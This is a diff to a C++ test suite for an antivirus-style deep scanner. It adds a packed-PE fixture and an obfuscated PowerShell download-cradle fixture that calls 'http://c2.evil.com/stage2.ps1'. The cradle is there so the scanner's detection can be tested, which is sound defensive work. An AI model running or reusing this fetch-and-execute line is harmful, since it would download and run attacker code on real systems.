@@ -27,6 +27,37 @@ void write_invalid_pe_fixture(const std::filesystem::path& path) {
     out.write(reinterpret_cast<const char*>(data.data()), static_cast<std::streamsize>(data.size()));
 }
 
+void write_packed_pe_fixture(const std::filesystem::path& path) {
+    std::vector<uint8_t> pe(1024, 0);
+    pe[0] = 'M'; pe[1] = 'Z';
+    pe[0x3C] = 0x80;
+    pe[0x80] = 'P'; pe[0x81] = 'E';
+    pe[0x84] = 0x4C; pe[0x85] = 0x01;
+    pe[0x86] = 1;
+    pe[0x94] = 0xE0;
+    pe[0x96] = 0x02; pe[0x97] = 0x01;
+    pe[0x98] = 0x0B; pe[0x99] = 0x01;
+    *reinterpret_cast<uint32_t*>(&pe[0xA8]) = 0x1000;
+
+    size_t sec_off = 0x178;
+    const char sec_name[] = "UPX0";
+    std::memcpy(&pe[sec_off], sec_name, 4);
+    *reinterpret_cast<uint32_t*>(&pe[sec_off + 8]) = 0x1000;
+    *reinterpret_cast<uint32_t*>(&pe[sec_off + 12]) = 0x1000;
+    *reinterpret_cast<uint32_t*>(&pe[sec_off + 16]) = 512;
+    *reinterpret_cast<uint32_t*>(&pe[sec_off + 20]) = 0x200;
+    *reinterpret_cast<uint32_t*>(&pe[sec_off + 36]) = 0xE0000020; // W^X
+
+    std::ofstream out(path, std::ios::binary | std::ios::trunc);
+    out.write(reinterpret_cast<const char*>(pe.data()), pe.size());
+}
+
+void write_obfuscated_script_fixture(const std::filesystem::path& path) {
+    std::string script = "`I`E`X (New-Object Net.Web`Client).'d'+'own'+'load'+'string'('http://c2.evil.com/stage2.ps1')";
+    std::ofstream out(path, std::ios::trunc);
+    out << script;
+}
+
 bool wait_for_scan_to_finish(gcad::DeepScanner& scanner) {
     for (int i = 0; i < 100 && scanner.is_scanning(); ++i)
         std::this_thread::sleep_for(std::chrono::milliseconds(50));
@@ -182,5 +213,39 @@ void register_deep_scanner_tests() {
         std::error_code ec;
         std::filesystem::remove_all(dir, ec);
         return finished;
+    });
+
+    register_test("deep_scanner_detects_packed_pe_via_static_analysis", [] {
+        const auto dir = make_temp_dir("gcad-deepscan-packedpe");
+        write_packed_pe_fixture(dir / "packed.exe");
+
+        gcad::DeepScanner scanner;
+        scanner.start_scan(gcad::ScanMode::CUSTOM, dir);
+        const bool finished = wait_for_scan_to_finish(scanner);
+
+        auto results = scanner.get_results();
+        std::error_code ec;
+        std::filesystem::remove_all(dir, ec);
+
+        if (!finished) return false;
+        if (results.empty()) return false;
+        return results[0].category == gcad::ThreatCategory::MALWARE_PACKER;
+    });
+
+    register_test("deep_scanner_detects_obfuscated_fileless_script", [] {
+        const auto dir = make_temp_dir("gcad-deepscan-script");
+        write_obfuscated_script_fixture(dir / "cradle.ps1");
+
+        gcad::DeepScanner scanner;
+        scanner.start_scan(gcad::ScanMode::CUSTOM, dir);
+        const bool finished = wait_for_scan_to_finish(scanner);
+
+        auto results = scanner.get_results();
+        std::error_code ec;
+        std::filesystem::remove_all(dir, ec);
+
+        if (!finished) return false;
+        if (results.empty()) return false;
+        return results[0].category == gcad::ThreatCategory::PERSISTENCE_HIJACK;
     });
 }
